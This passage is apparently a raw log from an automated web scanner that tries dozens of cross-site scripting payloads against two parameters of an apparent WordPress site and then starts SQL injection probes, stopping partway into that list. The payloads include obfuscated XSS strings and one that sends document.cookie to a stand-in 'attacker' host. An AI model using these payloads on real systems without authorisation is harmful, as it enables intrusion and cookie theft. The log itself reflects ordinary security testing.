+[XSS] (40/49) Testing payload on post_type: <form><input name="xss" value="<img src=x onerror=alert('XSS')>"></form><input type="text" value="<script>alert('XSS')</script>">
+[XSS] (40) No reflection detected.
+[XSS] (41/49) Testing payload on post_type: <textarea><script>alert('XSS')</script></textarea>
+[XSS] (41) No reflection detected.
+[XSS] (42/49) Testing payload on post_type: <form><button formaction="javascript:alert('XSS')">Click me</button></form>
+[XSS] (42) No reflection detected.
+[XSS] (43/49) Testing payload on post_type: <form><input type="hidden" name="xss" value="<script>alert('XSS')</script>"></form>
+[XSS] (43) No reflection detected.
+[XSS] (44/49) Testing payload on post_type: <input type="text" onfocus="alert('XSS')" value="Focus me">
+[XSS] (44) No reflection detected.
+[XSS] (45/49) Testing payload on post_type: <input type="button" value="Click me" onclick="alert('XSS')">
+[XSS] (45) No reflection detected.
+[XSS] (46/49) Testing payload on post_type: <form action="https://example.com/post" method="POST"><input type="text" value="<script>alert('XSS')</script>"></form>
+[XSS] (46) No reflection detected.
+[XSS] (47/49) Testing payload on post_type: <input type="text" value='"><script>alert(1)</script>'>
+[XSS] (47) No reflection detected.
+[XSS] (48/49) Testing payload on post_type: <input type="text" value='"><img src=x onerror=alert(1)>'>
+[XSS] (48) No reflection detected.
+[XSS] (49/49) Testing payload on post_type: <form><input name="xss" value="<img src=x onerror=alert('XSS')>"></form>
+[XSS] (49) No reflection detected.
+[XSS] (1/49) Testing payload on gdlr-core-privacy-settings: </title><svg/onload=confirm(1)>
+[XSS] (1) No reflection detected.
+[XSS] (2/49) Testing payload on gdlr-core-privacy-settings: <script>confirm(1)</script>
+[XSS] (2) No reflection detected.
+[XSS] (3/49) Testing payload on gdlr-core-privacy-settings: "/><img src=x onerror=alert(1)>
+[XSS] (3) No reflection detected.
+[XSS] (4/49) Testing payload on gdlr-core-privacy-settings: <svg><script>alert(1)</script>
+[XSS] (4) No reflection detected.
+[XSS] (5/49) Testing payload on gdlr-core-privacy-settings: <body onload=alert('xss')>
+[XSS] (5) No reflection detected.
+[XSS] (6/49) Testing payload on gdlr-core-privacy-settings: </tItLE><a/+/onPoINTEReNter%0a=%0aconfirm()%0dx//v3dm0s
+[XSS] (6) No reflection detected.
+[XSS] (7/49) Testing payload on gdlr-core-privacy-settings: <A%250donMOuseOvER%250a%3D%250aa%3Dprompt%2Ca()%250dx%2F%2Fv3dm0s<img src=1 onerror=confirm('xss')>
+[XSS] (7) No reflection detected.
+[XSS] (8/49) Testing payload on gdlr-core-privacy-settings: <iframe src="javascript:confirm(1)"></iframe>
+[XSS] (8) No reflection detected.
+[XSS] (9/49) Testing payload on gdlr-core-privacy-settings: <svg onload=alert`1`>
+[XSS] (9) No reflection detected.
+[XSS] (10/49) Testing payload on gdlr-core-privacy-settings: '"><svg/onload=alert(1)>
+[XSS] (10) No reflection detected.
+[XSS] (11/49) Testing payload on gdlr-core-privacy-settings: "><script>new Image().src='//attacker/?c='+document.cookie</script>
+[XSS] (11) No reflection detected.
+[XSS] (12/49) Testing payload on gdlr-core-privacy-settings: <input autofocus onfocus=alert(1)>
+[XSS] (12) No reflection detected.
+[XSS] (13/49) Testing payload on gdlr-core-privacy-settings: <details open ontoggle=alert(1)>Open</details>
+[XSS] (13) No reflection detected.
+[XSS] (14/49) Testing payload on gdlr-core-privacy-settings: <meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+[XSS] (14) No reflection detected.
+[XSS] (15/49) Testing payload on gdlr-core-privacy-settings: <object data="javascript:alert(1)"></object>
+[XSS] (15) No reflection detected.
+[XSS] (16/49) Testing payload on gdlr-core-privacy-settings: <svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>
+[XSS] (16) No reflection detected.
+[XSS] (17/49) Testing payload on gdlr-core-privacy-settings: <img src=x onerror=javascript:confirm%281%29>
+[XSS] (17) No reflection detected.
+[XSS] (18/49) Testing payload on gdlr-core-privacy-settings: <img src="x" onerror="/*
+*/alert(1)">
+[XSS] (18) No reflection detected.
+[XSS] (19/49) Testing payload on gdlr-core-privacy-settings: <video><source onerror=alert(1)></video>
+[XSS] (19) No reflection detected.
+[XSS] (20/49) Testing payload on gdlr-core-privacy-settings: <math><mi onmouseover=alert(1)>X</mi></math>
+[XSS] (20) No reflection detected.
+[XSS] (21/49) Testing payload on gdlr-core-privacy-settings: ' onmouseover=alert(1) x='
+[XSS] (21) No reflection detected.
+[XSS] (22/49) Testing payload on gdlr-core-privacy-settings: "><svg><g onload=alert(1)></g></svg>
+[XSS] (22) No reflection detected.
+[XSS] (23/49) Testing payload on gdlr-core-privacy-settings: </textarea><script>alert('xss')</script>
+[XSS] (23) No reflection detected.
+[XSS] (24/49) Testing payload on gdlr-core-privacy-settings: <a href="javascript:/*
+*/alert(1)">click</a>
+[XSS] (24) No reflection detected.
+[XSS] (25/49) Testing payload on gdlr-core-privacy-settings: <a href='javas&#99;ript:alert(1)'>x</a>
+[XSS] (25) No reflection detected.
+[XSS] (26/49) Testing payload on gdlr-core-privacy-settings: <svg><foreignObject><body onload=confirm(1)></body></foreignObject></svg>
+[XSS] (26) No reflection detected.
+[XSS] (27/49) Testing payload on gdlr-core-privacy-settings: <form action=javascript:alert(1)><input type=submit></form>
+[XSS] (27) No reflection detected.
+[XSS] (28/49) Testing payload on gdlr-core-privacy-settings: <img src=x onerror=eval('con'+'firm(1)')>
+[XSS] (28) No reflection detected.
+[XSS] (29/49) Testing payload on gdlr-core-privacy-settings: <script>setTimeout(()=>alert(1),0)</script>
+[XSS] (29) No reflection detected.
+[XSS] (30/49) Testing payload on gdlr-core-privacy-settings: %22%3e%3c%2f%64%69%76%3e%3c%68%31%3e%6b%65%64%6a%61%77%33%6e%3c%2f%68%31%3e
+[XSS] (30) No reflection detected.
+[XSS] (31/49) Testing payload on gdlr-core-privacy-settings: <input type="text" value="<script>alert('XSS')</script>">
+[XSS] (31) No reflection detected.
+[XSS] (32/49) Testing payload on gdlr-core-privacy-settings: <textarea><script>alert('XSS')</script></textarea>
+[XSS] (32) No reflection detected.
+[XSS] (33/49) Testing payload on gdlr-core-privacy-settings: <form><button formaction="javascript:alert('XSS')">Click me</button></form>
+[XSS] (33) No reflection detected.
+[XSS] (34/49) Testing payload on gdlr-core-privacy-settings: <form><input type="hidden" name="xss" value="<script>alert('XSS')</script>"></form>
+[XSS] (34) No reflection detected.
+[XSS] (35/49) Testing payload on gdlr-core-privacy-settings: <input type="text" onfocus="alert('XSS')" value="Focus me">
+[XSS] (35) No reflection detected.
+[XSS] (36/49) Testing payload on gdlr-core-privacy-settings: <input type="button" value="Click me" onclick="alert('XSS')">
+[XSS] (36) No reflection detected.
+[XSS] (37/49) Testing payload on gdlr-core-privacy-settings: <form action="https://example.com/post" method="POST"><input type="text" value="<script>alert('XSS')</script>"></form>
+[XSS] (37) No reflection detected.
+[XSS] (38/49) Testing payload on gdlr-core-privacy-settings: <input type="text" value='"><script>alert(1)</script>'>
+[XSS] (38) No reflection detected.
+[XSS] (39/49) Testing payload on gdlr-core-privacy-settings: <input type="text" value='"><img src=x onerror=alert(1)>'>
+[XSS] (39) No reflection detected.
+[XSS] (40/49) Testing payload on gdlr-core-privacy-settings: <form><input name="xss" value="<img src=x onerror=alert('XSS')>"></form><input type="text" value="<script>alert('XSS')</script>">
+[XSS] (40) No reflection detected.
+[XSS] (41/49) Testing payload on gdlr-core-privacy-settings: <textarea><script>alert('XSS')</script></textarea>
+[XSS] (41) No reflection detected.
+[XSS] (42/49) Testing payload on gdlr-core-privacy-settings: <form><button formaction="javascript:alert('XSS')">Click me</button></form>
+[XSS] (42) No reflection detected.
+[XSS] (43/49) Testing payload on gdlr-core-privacy-settings: <form><input type="hidden" name="xss" value="<script>alert('XSS')</script>"></form>
+[XSS] (43) No reflection detected.
+[XSS] (44/49) Testing payload on gdlr-core-privacy-settings: <input type="text" onfocus="alert('XSS')" value="Focus me">
+[XSS] (44) No reflection detected.
+[XSS] (45/49) Testing payload on gdlr-core-privacy-settings: <input type="button" value="Click me" onclick="alert('XSS')">
+[XSS] (45) No reflection detected.
+[XSS] (46/49) Testing payload on gdlr-core-privacy-settings: <form action="https://example.com/post" method="POST"><input type="text" value="<script>alert('XSS')</script>"></form>
+[XSS] (46) No reflection detected.
+[XSS] (47/49) Testing payload on gdlr-core-privacy-settings: <input type="text" value='"><script>alert(1)</script>'>
+[XSS] (47) No reflection detected.
+[XSS] (48/49) Testing payload on gdlr-core-privacy-settings: <input type="text" value='"><img src=x onerror=alert(1)>'>
+[XSS] (48) No reflection detected.
+[XSS] (49/49) Testing payload on gdlr-core-privacy-settings: <form><input name="xss" value="<img src=x onerror=alert('XSS')>"></form>
+[XSS] (49) No reflection detected.
+
+[~] Testing parameter 's'
+[~] Proceeding to SQLi phase (testing 114 payloads) for 's'.
+[SQLi] (1/114) Testing payload on s: ' OR '1'='1' -- 
+[SQLi] (1) No SQL error signature detected (resp_time=0.79s).
+[SQLi] (2/114) Testing payload on s: " OR "1"="1" -- 
+[SQLi] (2) No SQL error signature detected (resp_time=0.79s).
+[SQLi] (3/114) Testing payload on s: ' UNION SELECT NULL--
